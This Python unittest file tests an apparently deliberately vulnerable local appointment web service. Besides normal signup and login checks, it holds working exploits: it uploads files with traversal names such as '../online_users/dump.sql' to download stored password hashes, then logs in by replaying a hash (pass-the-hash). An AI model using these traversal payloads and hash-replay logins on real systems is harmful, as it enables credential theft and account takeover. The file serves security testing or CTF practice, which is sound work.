import random
import string
import unittest
import base64

import requests as rq


def get_random_user():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))


def get_user(username, password):
    obj = {
        'username': username,
        'password': base64.b64encode(bytes(password, 'utf-8')).decode('ascii'),
        'email': username + '@' + username + '.de',
        'login': 'signup'
    }
    req = rq.post('http://localhost:6597/login', data=obj)
    return req.history[0].cookies.get('sessionID')


def send_file_appointment(filename):
    user = get_random_user()
    session_id = get_user(user, user)
    data = {
        'prename': 'Paul',
        'lastname': 'Meyer',
        'date': '2021-05-06',
        'time': '02:56'
    }
    cookies = {
        'sessionID': session_id,
        'username': user
    }
    file = open('test_ids.txt', 'rb')
    files = {'id_image': (filename, file, 'application/octet-stream')}
    # req = rq.Request('POST', 'http://localhost:6597/make_appointment', data=data, files=files, cookies=cookies).prepare()
    # print(req.body.decode('ascii'))
    req = rq.post('http://localhost:6597/make_appointment', data=data, files=files, cookies=cookies)
    file.close()
    url = req.text[req.text.find('/get_id'):]
    url = url[:url.find('"')]
    url = 'http://localhost:6597' + url
    return url, cookies


def convert(test_str):
    res = []
    temp = []
    for token in test_str.split(","):
        num = str(token.replace("(", "").replace(")", ""))
        temp.append(num)
        if ")" in token:
            res.append(tuple(temp))
            temp = []
    return res


class TestPassTheHashVuln(unittest.TestCase):
    def test_pth(self):
        obj = {
            'username': 'HNYDUW0MHB',
            'password': base64.b64encode(
                bytes.fromhex('3B89BCF90E89EDCDED3A5A2C9EF09B42E4DC8C6546684673D94075C54F31B6B4')).decode('ascii'),
            'login': 'signin'
        }
        req = rq.post('http://localhost:6597/login', data=obj)
        self.assertEqual(200, req.status_code)

    def test_pth2(self):
        obj = {
            'username': 'HNYDUW0MHB',
            'password': base64.b64encode(bytes.fromhex('3B89B4')).decode('ascii'),
            'login': 'signin'
        }
        req = rq.post('http://localhost:6597/login', data=obj)
        self.assertEqual(401, req.status_code)


class TestDirectoryTraversal(unittest.TestCase):
    def test_get_own_id(self):
        filename = 'test_ids.txt'
        url, cookies = send_file_appointment(filename)

        download = rq.get(url, allow_redirects=True, cookies=cookies)
        self.assertEqual(download.content.decode('ascii'), 'tesfile')

    def test_get_hashes(self):
        filename = '../online_users/hashes.txt'
        url, cookies = send_file_appointment(filename)

        download = rq.get(url, allow_redirects=True, cookies=cookies)
        self.assertEqual(download.content.decode('ascii'), 'secret hashes stored')

    def test_get_dump(self):
        filename = '../online_users/dump.sql'
        url, cookies = send_file_appointment(filename)

        download = rq.get(url, allow_redirects=True, cookies=cookies)
        sql_string = download.content[27:-2].decode('ascii')
        user_list = convert(sql_string)
        print(user_list)
        user = (user_list[0][1])[1:-1]
        hash = (user_list[0][2])[2:]
        obj = {
            'username': user,
            'password': base64.b64encode(
                bytes.fromhex(hash)).decode('ascii'),
            'login': 'signin'
        }
        req = rq.post('http://localhost:6597/login', data=obj)
        self.assertEqual(200, req.status_code)



class TestSimpleLogin(unittest.TestCase):
    def test_create_user(self):
        user = get_random_user()
        obj = {
            'username': user,
            'password': base64.b64encode(b'mysecretpass').decode('ascii'),
            'email': user + '@' + user + '.de',
            'login': 'signup'
        }
        req = rq.post('http://localhost:6597/login', data=obj)
        self.assertEqual(200, req.status_code)

    def test_check_user(self):
        user = get_random_user()
        obj = {
            'username': user,
            'password': base64.b64encode(b'mysecretpass').decode('ascii'),
            'email': user + '@' + user + '.de',
            'login': 'signup'
        }
        req = rq.post('http://localhost:6597/login', data=obj)
        self.assertEqual(200, req.status_code)
        obj['login'] = 'signin'
        req2 = rq.post('http://localhost:6597/login', data=obj)
        self.assertEqual(200, req2.status_code)
        obj['password'] = base64.b64encode(b'mysecretPass').decode('ascii')
        req3 = rq.post('http://localhost:6597/login', data=obj)
        self.assertEqual(401, req3.status_code)

    def test_duplicate_user(self):
        user = get_random_user()
        obj = {
            'username': user,
            'password': base64.b64encode(b'mysecretpass').decode('ascii'),
            'email': user + '@' + user + '.de',
            'login': 'signup'
        }
        req = rq.post('http://localhost:6597/login', data=obj)
        self.assertEqual(200, req.status_code)
        req2 = rq.post('http://localhost:6597/login', data=obj)
        self.assertEqual(401, req2.status_code)


if __name__ == '__main__':
    unittest.main()
